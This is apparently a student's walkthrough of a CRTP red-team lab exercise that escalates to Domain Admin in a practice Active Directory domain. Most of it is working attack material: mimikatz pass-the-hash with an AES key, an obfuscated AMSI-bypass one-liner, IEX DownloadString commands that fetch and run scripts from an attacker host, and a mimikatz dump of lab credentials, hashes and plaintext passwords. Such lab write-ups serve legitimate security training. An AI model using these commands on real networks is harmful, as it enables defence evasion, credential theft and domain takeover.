# CRTP: Hands-On 7

```
• Identify a machine in the target domain where a Domain Admin session is available.
• Compromise the machine and escalate privileges to Domain Admin:
  – Using access to dcorp-ci
  – Using derivative local admin
```

Index:
  
  1. [Identify Domain Admin Session](#identify-domain-admin-session)
  2. [Compromise machine](#compromise-machine)


## Identify Domain Admin Session

Create ciadmin session:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:ciadmin /aes256:1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879 /run:cmd" "exit"

```

Access to dcorp-ci and import PowerView monule:

```
PS C:\Windows\system32> Import-Module C:\AD\Tools\PowerView.ps1
PS C:\Windows\system32> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess
dcorp-ci
dcorp-mgmt
PS C:\Windows\system32> Enter-PSSession -ComputerName dcorp-ci
```
Bypass AMSI:

```
[dcorp-ci]: PS C:\Users\ciadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
[dcorp-ci]: PS C:\Users\ciadmin\Documents> IEX (New-Object Net.webclient).DownloadString("http://172.16.100.162/PowerView.ps1")
```
```
Find-DomainUserLocation
```

## Compromise machine

Access to dcorp-mgmt machine with ciadmin privileges:
```
PS C:\Windows\system32> Enter-PSSession -ComputerName dcorp-mgmt
[dcorp-mgmt]: PS C:\Users\ciadmin\Documents> whoami
dcorp\ciadmin
[dcorp-mgmt]: PS C:\Users\ciadmin\Documents> hostname
dcorp-mgmt
[dcorp-mgmt]: PS C:\Users\ciadmin\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::a1f:6a04:7a2:71a1%6
   IPv4 Address. . . . . . . . . . . : 172.16.4.44
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254
```

Dump credentials:

```
[dcorp-mgmt]: PS C:\Users\ciadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
[dcorp-mgmt]: PS C:\Users\ciadmin\Documents> IEX (New-Object Net.webclient).DownloadString("http://172.16.100.162/Invoke-MimiEx.ps1")

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::ekeys

Authentication Id : 0 ; 432249 (00000000:00069879)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/28/2023 4:00:54 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

Authentication Id : 0 ; 212650 (00000000:00033eaa)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:46:32 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 57877 (00000000:0000e215)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:06 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:02 AM
SID               : S-1-5-20

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 20788 (00000000:00005134)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:02 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 57301 (00000000:0000dfd5)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/28/2023 3:44:06 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8

Authentication Id : 0 ; 20821 (00000000:00005155)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:02 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:01 AM
SID               : S-1-5-18

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

```
